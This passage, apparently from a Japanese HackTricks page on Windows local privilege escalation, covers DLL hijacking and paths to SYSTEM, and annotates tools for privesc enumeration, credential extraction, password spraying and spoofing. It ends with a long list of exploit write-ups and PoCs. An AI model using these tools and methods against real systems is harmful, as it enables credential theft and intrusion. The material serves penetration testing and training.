[name pipesについて詳しく知りたい場合はこちらをお読みください。](#named-pipe-client-impersonation)\
[name pipesを使ってHigh IntegrityからSystemに移行する方法の例はこちらをお読みください。](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

SYSTEMとして実行されている**プロセス**に**ロード**されるdllを**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingはこの種の権限昇格にも有効です。さらに、dllのロードに使われるフォルダーへの**書き込み権限**があるため、High Integrityプロセスからなら**はるかに簡単に実行できます**。\
**Dll hijackingについて詳しくは[**こちら**](dll-hijacking/index.html)をご覧ください。**

### **AdministratorまたはNetwork ServiceからSystemへ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICEまたはNETWORK SERVICEからfull privsへ

**参照：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのローカル権限昇格ベクトルを探すのに最適なツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルを確認します（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出されます。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 考えられる設定ミスを確認し、情報を収集します（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスを確認します**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカルで-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出されます。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン内でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（WatsonによりDEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（Admin rightsが必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioでコンパイルする必要があります）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストをenumerationします（privescツールというより情報収集ツールです）（コンパイルが必要です） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスを確認します（githubにprecompiled executableがあります）。非推奨です。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 考えられる設定ミスを確認します（Python製exe）。非推奨です。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿を基に作成されたツールです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを提案します（ローカルPython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを提案します（ローカルPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NETの正しいバージョンを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim hostにインストールされている.NETのバージョンを確認するには、次のように実行します。

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows 権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [フォルダー権限の弱点を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows 権限昇格チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows 権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows 権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester 向け Windows 権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA マクロフィッシング → hMailServer の認証情報を復号 → Veeam CVE-2023-27532 による SYSTEM 権限取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) とカーネルトークンの窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox を追う: カーネルの影における攻防](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA システムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [シンボリックリンクのテストツール – CreateSymlink の使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windows のシンボリックリンクを悪用する](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF への移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js の Trust Falls: Windows における危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js モジュール: `node_modules` フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリのハイジャック](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop での Pwn2Own: CLDFLT と DirectX カーネルの Race Condition を連鎖させた Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する I/O Ring: Windows 11 における完全な読み書き Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の便利なテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs の Exploit コード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS 攻撃 Part 2: CVE-2020-1013、Windows 10 のローカル権限昇格 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager と Windows Vault を探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - イメージの変更が権限昇格につながる場合の Kerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 の SSH Agent から SSH 秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業の更新サーバーをバックドア工場に変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業の更新サーバーをバックドア工場に変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer フォルダーの削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
